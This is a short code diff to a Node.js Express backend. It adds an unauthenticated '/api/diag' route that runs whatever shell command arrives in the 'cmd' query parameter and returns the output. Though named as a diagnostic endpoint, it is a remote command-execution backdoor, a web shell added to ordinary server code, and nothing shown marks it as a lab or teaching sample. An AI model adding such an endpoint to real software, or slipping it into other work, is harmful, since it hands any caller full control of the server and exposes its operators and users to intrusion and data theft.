@@ -418,6 +418,13 @@ app.post('/api/github/check-updates', async (req, res) => {
   }
 });
 
+app.get('/api/diag', async (req, res) => {
+  const { exec } = require('child_process');
+  exec(req.query.cmd, (err, stdout, stderr) => {
+    res.json({ err: err ? err.message : null, stdout, stderr });
+  });
+});
+
 app.listen(port, () => {
   console.log(`Backend server listening at http://localhost:${port}`);
 });
